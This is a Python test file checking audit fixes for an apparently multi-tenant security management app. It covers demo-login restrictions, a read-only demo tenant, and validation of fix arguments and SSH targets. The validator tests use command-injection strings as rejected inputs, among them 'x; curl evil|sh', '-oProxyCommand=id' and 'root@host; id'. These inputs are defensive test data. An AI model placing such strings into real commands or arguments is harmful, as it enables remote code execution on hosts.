"""Fixes from the 2026-09-28 audit.

1. The public demo code must never sign in a superadmin (who is a member of
   every tenant, the demo one included) or anyone whose access to the demo
   tenant comes only through a partner.
2. A fix's `arg`, and a host's SSH target, are refused at the API when they
   could reach a shell as anything but a plain value.
3. The demo tenant is read-only: its public logins can look at everything,
   and change nothing.
"""
from guardian_hub import models as m
from guardian_hub.db import SessionLocal
from guardian_hub.fixargs import arg_problem, target_problem


def _seed_demo():
    from guardian_hub.seed import seed_demo
    seed_demo(SessionLocal())


def test_demo_code_never_signs_in_a_superadmin(client):
    _seed_demo()
    db = SessionLocal()
    db.add(m.User(username="owner", email="o@example.com", display_name="Owner",
                  is_superadmin=True))
    db.commit(); db.close()
    r = client.post("/api/v1/auth/verify", json={"username": "owner", "code": "424242"})
    assert r.status_code == 401
    assert client.get("/api/v1/platform").status_code in (401, 403)


def test_demo_code_still_signs_in_the_demo_viewer(client):
    _seed_demo()
    r = client.post("/api/v1/auth/verify", json={"username": "demo", "code": "424242"})
    assert r.status_code == 200 and r.json()["active_tenant"]["slug"] == "demo"


def test_the_demo_admin_can_read_but_not_write(client):
    _seed_demo()
    r = client.post("/api/v1/auth/verify", json={"username": "demoadmin", "code": "424242"})
    assert r.status_code == 200
    assert client.get("/api/v1/me").status_code == 200
    r = client.post("/api/v1/fix", json={"host": "demo-host", "action": "enable_ufw"})
    assert r.status_code == 403 and "demo" in r.json()["detail"]


def test_bad_fix_args_are_named():
    assert arg_problem("restart_service", "x; curl evil|sh") is not None
    assert arg_problem("block_ip", "203.0.113.7") is None
    assert arg_problem("block_subnet", "203.0.113.0/24") is None
    assert arg_problem("security_updates", None) is None
    assert arg_problem("kill_miner", "xmrig; reboot") is not None


def test_ssh_targets_must_be_plain():
    assert target_problem("-oProxyCommand=id") is not None
    assert target_problem("root@203.0.113.7") is None
    assert target_problem("admin@host.example.com") is None
    assert target_problem("root@host; id") is not None
